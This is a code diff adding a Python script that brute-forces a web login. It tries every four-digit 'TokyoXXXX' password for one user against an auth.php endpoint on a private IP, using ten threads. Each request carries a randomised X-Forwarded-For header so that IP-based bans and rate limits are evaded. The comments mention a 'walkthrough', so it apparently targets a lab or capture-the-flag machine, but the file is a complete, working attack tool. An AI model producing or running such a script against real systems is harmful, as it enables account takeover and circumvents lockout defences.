@@ -1,0 +1,62 @@
+import requests
+import random
+from concurrent.futures import ThreadPoolExecutor
+
+# Target configuration
+TARGET_URL = "http://10.114.185.234/auth.php"
+USERNAME = "deliver11"
+THREADS = 10  # Adjust based on server stability to avoid L4 bans
+
+def generate_random_ip():
+    """Generates a random IP address for the X-Forwarded-For header."""
+    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+
+def attempt_login(pin):
+    """Sends a single POST request to the target with rotated IP."""
+    password = f"Tokyo{pin:04d}"
+    fake_ip = generate_random_ip()
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
+        "X-Forwarded-For": fake_ip,
+        "Content-Type": "application/x-www-form-urlencoded"
+    }
+    
+    data = {
+        "username": USERNAME,
+        "password": password
+    }
+
+    try:
+        # We use a short timeout to keep the script moving
+        response = requests.post(TARGET_URL, headers=headers, data=data, timeout=5)
+        
+        # Checking for success: Based on walkthrough, we look for responses 
+        # that DON'T contain 'auth_failed' or have a different length.
+        if "auth_failed" not in response.text:
+            print(f"\n[+] SUCCESS! Password found: {password}")
+            print(f"[+] Response Length: {len(response.text)}")
+            return True
+            
+    except requests.exceptions.RequestException:
+        # Silently ignore connection errors which are common during high-speed fuzzing
+        pass
+    return False
+
+def main():
+    print(f"[*] Starting attack on {TARGET_URL}")
+    print(f"[*] Target User: {USERNAME} | Pattern: TokyoXXXX")
+    
+    # Using ThreadPoolExecutor for efficient multi-threading
+    with ThreadPoolExecutor(max_workers=THREADS) as executor:
+        # Mapping 0-9999 to the attempt_login function
+        results = executor.map(attempt_login, range(10000))
+        
+        for found in results:
+            if found:
+                # If password is found, we shut down the executor immediately
+                executor.shutdown(wait=False)
+                break
+
+if __name__ == "__main__":
+    main()
